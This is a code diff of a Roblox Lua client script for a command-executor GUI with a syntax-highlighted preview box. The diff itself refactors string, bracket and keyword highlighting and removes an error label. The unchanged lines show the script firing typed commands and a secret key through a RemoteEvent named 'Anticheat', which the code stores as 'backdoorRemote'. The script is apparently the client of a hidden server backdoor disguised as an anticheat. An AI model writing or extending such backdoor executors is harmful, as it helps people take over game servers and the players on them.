@@ -2,15 +2,14 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local userInputService = game:GetService("UserInputService")
-local tweenService = game:GetService("TweenService")
 local backdoorRemote = ReplicatedStorage:WaitForChild("Anticheat")
 local SECRET_KEY = "YOUR_SECRET_KEY_HERE"
 
 local function executeServerCommand(command, data)
-    if typeof(data) == "string" then
-        data = data:gsub("[Uu]ser", LocalPlayer.Name)
-    end
-    backdoorRemote:FireServer(command, data, SECRET_KEY)
+	if typeof(data) == "string" then
+		data = data:gsub("[Uu]ser", LocalPlayer.Name)
+	end
+	backdoorRemote:FireServer(command, data, SECRET_KEY)
 end
 
 local screenGui = Instance.new("ScreenGui")
@@ -79,19 +78,8 @@ previewBox.TextWrapped = true
 previewBox.RichText = true
 previewBox.TextXAlignment = Enum.TextXAlignment.Left
 previewBox.TextYAlignment = Enum.TextYAlignment.Top
-previewBox.Text = "-- Preview will update here with rich text formatting --"
+previewBox.Text = "-- Preview will update here --"
 previewBox.Parent = frame
-
-local errorLabel = Instance.new("TextLabel")
-errorLabel.Size = UDim2.new(1, -20, 0, 50)
-errorLabel.Position = UDim2.new(0, 10, 0, 390)
-errorLabel.BackgroundTransparency = 1
-errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-errorLabel.Font = Enum.Font.GothamBold
-errorLabel.TextSize = 24
-errorLabel.Text = ""
-errorLabel.Visible = false
-errorLabel.Parent = frame
 
 local executeButton = Instance.new("TextButton")
 executeButton.Size = UDim2.new(0.3, -10, 0.1, 0)
@@ -167,7 +155,33 @@ local keywords = {
 	["Part"] = "#0000FF"
 }
 
-local function updatePreview(text)
+local function extractStrings(text)
+	local placeholders = {}
+	local index = 1
+	local result = text:gsub("(\"[^\"]-\"|'[^']-')", function(str)
+		placeholders[index] = str
+		local placeholder = "%%STR" .. index .. "%%"
+		index = index + 1
+		return placeholder
+	end)
+	return result, placeholders
+end
+
+local function restoreStrings(text, placeholders)
+	for i, str in pairs(placeholders) do
+		local color = "#7FFF00"
+		text = text:gsub("%%STR" .. i .. "%%", "<font color=\""..color.."\">"..str.."</font>")
+	end
+	return text
+end
+
+local function highlightBrackets(text)
+	text = text:gsub("(%b())", "<font color=\"#00BFFF\">%1</font>")
+	text = text:gsub("(%b{})", "<font color=\"#FF69B4\">%1</font>")
+	return text
+end
+
+local function highlightKeywords(text)
 	for word, color in pairs(keywords) do
 		if word == "Part" then
 			text = text:gsub("Workspace%.(" .. word .. ")", "<font color=\"#0000FF\">%1</font>")
@@ -176,11 +190,15 @@ local function updatePreview(text)
 			text = text:gsub("(%f[%w])(" .. word .. ")(%f[%W])", "<font color=\"" .. color .. "\">%2</font>")
 		end
 	end
-	text = text:gsub("(%b())", "<font color=\"#00BFFF\">%1</font>")
-	text = text:gsub("(%b\"\")", "<font color=\"#7FFF00\">%1</font>")
-	text = text:gsub("(%b'')", "<font color=\"#7FFF00\">%1</font>")
-	text = text:gsub("(%b{})", "<font color=\"#FF69B4\">%1</font>")
 	return text
+end
+
+local function updatePreview(text)
+	local noStrings, placeholders = extractStrings(text)
+	noStrings = highlightBrackets(noStrings)
+	noStrings = highlightKeywords(noStrings)
+	noStrings = restoreStrings(noStrings, placeholders)
+	return noStrings
 end
 
 inputBox.Changed:Connect(function(prop)
@@ -200,7 +218,7 @@ end)
 
 clearButton.MouseButton1Click:Connect(function()
 	inputBox.Text = ""
-	previewBox.Text = "-- Preview will update here with rich text formatting --"
+	previewBox.Text = "-- Preview will update here --"
 end)
 
 userInputService.InputBegan:Connect(function(input, gameProcessed)
